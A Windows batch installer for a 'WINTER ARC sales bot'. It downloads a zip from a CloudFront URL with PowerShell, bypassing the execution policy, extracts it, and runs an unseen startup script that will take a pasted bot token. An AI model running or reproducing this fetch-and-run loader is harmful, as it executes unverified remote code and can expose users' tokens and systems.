@echo off
rem WINTER ARC sales bot installer: downloads the bot to %USERPROFILE%\WinterArcBot and starts setup.
rem The bot token is asked in this window: paste it with Ctrl+V or right click, then press Enter.
set "DEST=%USERPROFILE%\WinterArcBot"
set "URL=https://d2ol7oe51mr4n9.cloudfront.net/user_3JoppAlhrzv4RWeSyfI2vtpTHg8/63190076-f086-4ccc-90f6-af07d3bd84ed.zip"
echo Downloading the bot to %DEST% ...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; [Net.ServicePointManager]::SecurityProtocol='Tls12'; $ProgressPreference='SilentlyContinue'; $z=Join-Path $env:TEMP 'WinterArcBot.zip'; Invoke-WebRequest -Uri $env:URL -OutFile $z -UseBasicParsing; Expand-Archive -Path $z -DestinationPath $env:DEST -Force"
if errorlevel 1 (
  echo.
  echo Download failed. Check the internet connection or turn on VPN and run this file again.
  pause
  exit /b 1
)
echo Done. Starting setup...
cd /d "%DEST%"
call "%DEST%\start_salesbot.bat"
